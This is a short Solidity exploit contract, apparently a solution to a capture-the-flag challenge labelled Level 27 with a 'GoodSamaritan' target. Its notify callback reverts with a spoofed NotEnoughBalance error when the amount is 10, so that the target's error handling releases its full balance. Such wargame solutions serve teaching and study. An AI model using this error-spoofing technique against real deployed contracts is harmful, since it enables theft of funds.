// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { INotifyable, GoodSamaritan } from "src/Level27.sol";

contract L27Attack is INotifyable {
    error NotEnoughBalance();

    GoodSamaritan immutable samaritan;

    constructor(GoodSamaritan _samaritan) {
        samaritan = _samaritan;
    }

    function attack() external {
        samaritan.requestDonation();
    }

    function notify(uint256 amount) external pure override {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
